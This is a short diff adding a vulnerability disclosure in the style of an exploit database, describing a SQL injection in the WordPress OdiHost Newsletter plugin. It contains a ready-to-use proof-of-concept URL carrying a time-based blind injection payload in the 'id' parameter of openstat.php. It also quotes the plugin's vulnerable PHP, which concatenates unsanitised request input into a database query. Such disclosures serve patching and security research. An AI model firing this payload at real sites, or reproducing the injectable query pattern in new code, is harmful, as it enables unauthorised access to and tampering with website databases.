@@ -1,0 +1,20 @@
+# Exploit Title: WordPress OdiHost Newsletter plugin <= 1.0 SQL Injection Vulnerability
+# Date: 2011-08-17
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/odihost-newsletter-plugin.zip
+# Version: 1.0 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/odihost-newsletter-plugin/includes/openstat.php?uid=-1&id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+
+---------------
+Vulnerable code
+---------------
+$newsletterid = $_GET["id"];
+
+...
+	
+$wpdb->query("update newsletterstat set newsletterstatopened = CONCAT(newsletterstatopened ,'". $subscriberid . ",') where newsletterstatnewsletterid= ". $newsletterid);
+
